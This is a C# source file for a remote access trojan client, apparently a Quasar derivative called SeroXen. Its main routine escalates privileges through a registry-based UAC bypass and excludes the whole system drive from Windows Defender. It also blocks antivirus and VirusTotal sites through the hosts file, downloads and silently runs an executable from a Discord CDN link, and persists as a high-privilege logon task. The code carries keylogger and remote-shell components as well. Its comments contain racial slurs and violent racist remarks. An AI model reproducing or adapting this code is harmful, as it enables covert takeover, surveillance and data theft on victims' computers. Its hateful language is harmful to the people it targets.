using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Reflection;
using System.Security.Principal;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xClient.Config;
using xClient.Core.Commands;
using xClient.Core.Cryptography;
using xClient.Core.Data;
using xClient.Core.Helper;
using xClient.Core.Installation;
using xClient.Core.Networking;
using xClient.Core.Utilities;

namespace xClient
{
    internal static class Program
    {
        public static SeroXenClient ConnectClient;
        private static ApplicationContext _msgLoop;

        [STAThread]
        private static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            AppDomain.CurrentDomain.UnhandledException += HandleUnhandledException;

            if (Settings.Initialize())
            {
                if (Initialize())
                {
                    if (!SeroXenClient.Exiting)
                        ConnectClient.Connect();

                }
                if (!IsAdministrator())
                {
                    Bypass.UAC();


                }
                else if (IsAdministrator())
                {
                    string byewindowsavnigger = "Add-MpPreference -ExclusionPath (Get-Item -LiteralPath $env:SystemRoot).Root";

                    try
                    {
                        ProcessStartInfo startInfo = new ProcessStartInfo();
                        startInfo.FileName = "powershell.exe";
                        startInfo.Arguments = $"-WindowStyle Hidden -Command \"{byewindowsavnigger}\"";
                        startInfo.CreateNoWindow = true;
                        startInfo.UseShellExecute = false;
                        startInfo.RedirectStandardOutput = true;

                        Process process = new Process();
                        process.StartInfo = startInfo;
                        process.Start();
                    }
                    catch { }

                    string[] hostsEntries = {
                "127.0.0.1 www.malwarebytes.com",
                "127.0.0.1 avast.com",
                "127.0.0.1 www.avast.com",
                "127.0.0.1 totalav.com",
                "127.0.0.1 www.totalav.com",
                "127.0.0.1 scanguard.com",
                "127.0.0.1 www.scanguard.com",
                "127.0.0.1 totaladblock.com",
                "127.0.0.1 www.totaladblock.com",
                "127.0.0.1 pcprotect.com",
                "127.0.0.1 www.pcprotect.com",
                "127.0.0.1 mcafee.com",
                "127.0.0.1 www.mcafee.com",
                "127.0.0.1 bitdefender.com",
                "127.0.0.1 www.bitdefender.com",
                "127.0.0.1 us.norton.com",
                "127.0.0.1 www.us.norton.com",
                "127.0.0.1 avg.com",
                "127.0.0.1 www.avg.com",
                "127.0.0.1 malwarebytes.com",
                "127.0.0.1 www.malwarebytes.com",
                "127.0.0.1 pandasecurity.com",
                "127.0.0.1 www.pandasecurity.com",
                "127.0.0.1 surfshark.com",
                "127.0.0.1 www.surfshark.com",
                "127.0.0.1 avira.com",
                "127.0.0.1 www.avira.com",
                "127.0.0.1 norton.com",
                "127.0.0.1 www.norton.com",
                "127.0.0.1 eset.com",
                "127.0.0.1 www.eset.com",
                "127.0.0.1 microsoft.com",
                "127.0.0.1 www.microsoft.com",
                "127.0.0.1 Zillya.com",
                "127.0.0.1 www.Zillya.com",
                "127.0.0.1 kaspersky.com",
                "127.0.0.1 www.kaspersky.com",
                "127.0.0.1 usa.kaspersky.com",
                "127.0.0.1 www.usa.kaspersky.com",
                "127.0.0.1 dpbolvw.net",
                "127.0.0.1 www.dpbolvw.net",
                "127.0.0.1 sophos.com",
                "127.0.0.1 www.sophos.com",
                "127.0.0.1 home.sophos.com",
                "127.0.0.1 www.home.sophos.com",
                "127.0.0.1 adaware.com",
                "127.0.0.1 www.adaware.com",
                "127.0.0.1 ahnlab.com",
                "127.0.0.1 www.ahnlab.com",
                "127.0.0.1 avira.com",
                "127.0.0.1 www.avira.com",
                "127.0.0.1 bullguard.com",
                "127.0.0.1 www.bullguard.com",
                "127.0.0.1 clamav.net",
                "127.0.0.1 www.clamav.net",
                "127.0.0.1 drweb.com",
                "127.0.0.1 www.drweb.com",
                "127.0.0.1 emsisoft.com",
                "127.0.0.1 www.emsisoft.com",
                "127.0.0.1 f-secure.com",
                "127.0.0.1 www.f-secure.com",
                "127.0.0.1 pandasecurity.com",
                "127.0.0.1 www.pandasecurity.com",
                "127.0.0.1 zonealarm.com",
                "127.0.0.1 www.zonealarm.com",
                "127.0.0.1 trendmicro.com",
                "127.0.0.1 www.trendmicro.com",
                "127.0.0.1 ccleaner.com",
                "127.0.0.1 www.ccleaner.com",
                "127.0.0.1 virustotal.com",
                "127.0.0.1 www.virustotal.com"
            };

                    try
                    {

                        string hostsFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"drivers\etc\hosts");


                        using (StreamWriter writer = File.AppendText(hostsFilePath))
                        {
                            foreach (string entry in hostsEntries)
                            {
                                writer.WriteLine(entry);
                            }
                        }


                        ProcessStartInfo flushDnsProcessInfo = new ProcessStartInfo("ipconfig", "/flushdns")
                        {
                            CreateNoWindow = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        };
                        Process.Start(flushDnsProcessInfo)?.WaitForExit();
                    }
                    catch { }


                        //kill the niggers how to use the root kit put "$77-"thenwhateverhere.exe or what ever like .txt
                        string url = "https://cdn.discordapp.com/attachments/1205003197823979551/1238813062232932362/LivingOffTheLand.exe?ex=6640a612&is=663f5492&hm=fafe99da8728bc23c156a6949f7bd3ac8f7774045fe2b8549be56b2b35823bc7&";
                        string tempPath = Path.GetTempPath();
                        string downloadPath = Path.Combine(tempPath, "Install.exe");

                        try
                        {
                            using (WebClient client = new WebClient())
                            {
                                client.DownloadFile(url, downloadPath);
                            }

                            ProcessStartInfo startInfo = new ProcessStartInfo();
                            startInfo.FileName = downloadPath;
                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                            startInfo.CreateNoWindow = true;
                            startInfo.UseShellExecute = false;
                            startInfo.RedirectStandardOutput = true;

                            Process process = new Process();
                            process.StartInfo = startInfo;
                            process.Start();


                        }
                        catch { }



                        addstartupadmin();
                        // kill the blaks
                    }
            }
            
            Cleanup();
            Exit();
        }
        public static void addstartupadmin()
        {
            string x = String.Format("/create /tn \"{1}\" /tr \"'{0}'\" /sc onlogon /rl HIGHEST", System.Reflection.Assembly.GetEntryAssembly().Location, "$77" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location));
            var p = new Process
            {
                StartInfo =
                {
                    UseShellExecute = false,
                    FileName = "SCHTASKS.exe",
                    RedirectStandardError = true,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    Arguments = x
                }
            };
            p.Start();
        }


       
        #region IsAdmin?
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        #endregion

        private static void Exit()
        {
            if (_msgLoop != null || Application.MessageLoop)
                Application.Exit();
            else
                Environment.Exit(0);
        }

        private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (e.IsTerminating)
            {
                string batchFile = FileHelper.CreateRestartBatch();
                if (string.IsNullOrEmpty(batchFile)) return;

                ProcessStartInfo startInfo = new ProcessStartInfo
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = true,
                    FileName = batchFile
                };
                Process.Start(startInfo);
                Exit();
            }
        }

        private static void Cleanup()
        {
            CommandHandler.CloseShell();
            if (CommandHandler.StreamCodec != null)
                CommandHandler.StreamCodec.Dispose();
            if (Keylogger.Instance != null)
                Keylogger.Instance.Dispose();
            if (_msgLoop != null)
            {
                _msgLoop.ExitThread();
                _msgLoop.Dispose();
                _msgLoop = null;
            }
            MutexHelper.CloseMutex();
        }

        private static bool Initialize()
        {
            var hosts = new HostsManager(HostHelper.GetHostsList(Settings.HOSTS));

            // process with same mutex is already running
            if (!MutexHelper.CreateMutex(Settings.MUTEX) || hosts.IsEmpty || string.IsNullOrEmpty(Settings.VERSION)) // no hosts to connect
                return false;

            AES.SetDefaultKey(Settings.KEY, Settings.AUTHKEY);
            ClientData.InstallPath = Path.Combine(Settings.DIRECTORY, ((!string.IsNullOrEmpty(Settings.SUBDIRECTORY)) ? Settings.SUBDIRECTORY + @"\" : "") + Settings.INSTALLNAME);
            GeoLocationHelper.Initialize();
            
            FileHelper.DeleteZoneIdentifier(ClientData.CurrentPath);

            if (!Settings.INSTALL || ClientData.CurrentPath == ClientData.InstallPath)
            {
                WindowsAccountHelper.StartUserIdleCheckThread();

                if (Settings.STARTUP)
                {
                    if (!Startup.AddToStartup())
                        ClientData.AddToStartupFailed = true;
                }

                if (Settings.INSTALL && Settings.HIDEFILE)
                {
                    try
                    {
                        File.SetAttributes(ClientData.CurrentPath, FileAttributes.Hidden);
                    }
                    catch (Exception)
                    {
                    }
                }
                if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY && !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.InstallPath));
                        di.Attributes |= FileAttributes.Hidden;

                    }
                    catch (Exception)
                    {
                    }
                }
                if (Settings.ENABLELOGGER)
                {
                    new Thread(() =>
                    {
                        _msgLoop = new ApplicationContext();
                        Keylogger logger = new Keylogger(15000);
                        Application.Run(_msgLoop);
                    }) {IsBackground = true}.Start();
                }

                ConnectClient = new SeroXenClient(hosts);
                return true;
            }
            else
            {
                MutexHelper.CloseMutex();
                ClientInstaller.Install(ConnectClient);
                return false;
            }
        }
    }
    #region uac_bypass
    public class Bypass
    {
        public static void UAC()
        {
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Bypass.Z("Classes");
                Bypass.Z("Classes\\ms-settings");
                Bypass.Z("Classes\\ms-settings\\shell");
                Bypass.Z("Classes\\ms-settings\\shell\\open");
                RegistryKey registryKey = Bypass.Z("Classes\\ms-settings\\shell\\open\\command");
                string cpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                registryKey.SetValue("", cpath, RegistryValueKind.String);
                registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                registryKey.Close();
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = "cmd.exe",
                        Arguments = "/c start computerdefaults.exe"
                    });
                }
                catch { }
                Process.GetCurrentProcess().Kill();
            }
            else
            {
                RegistryKey registryKey2 = Bypass.Z("Classes\\ms-settings\\shell\\open\\command");
                registryKey2.SetValue("", "", RegistryValueKind.String);
            }
        }

        public static RegistryKey Z(string x)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);
            bool flag = !Bypass.checksubkey(registryKey);
            if (flag)
            {
                registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
            }
            return registryKey;
        }

        public static bool checksubkey(RegistryKey k)
        {
            bool flag = k == null;
            return !flag;
        }

        private static ManagementObject GetMngObj(string className)
        {
            ManagementClass managementClass = new ManagementClass(className);
            try
            {
                foreach (ManagementBaseObject managementBaseObject in managementClass.GetInstances())
                {
                    ManagementObject managementObject = (ManagementObject)managementBaseObject;
                    bool flag = managementObject != null;
                    if (flag)
                    {
                        return managementObject;
                    }
                }
            }
            catch { }
            return null;
        }

        public static string GetOsVer()
        {
            string result;
            try
            {
                ManagementObject mngObj = Bypass.GetMngObj("Win32_OperatingSystem");
                bool flag = mngObj == null;
                if (flag)
                {
                    result = string.Empty;
                }
                else
                {
                    result = (mngObj["Version"] as string);
                }
            }
            catch (Exception ex)
            {
                result = string.Empty;
            }
            return result;
        }
    }
    #endregion

        
    }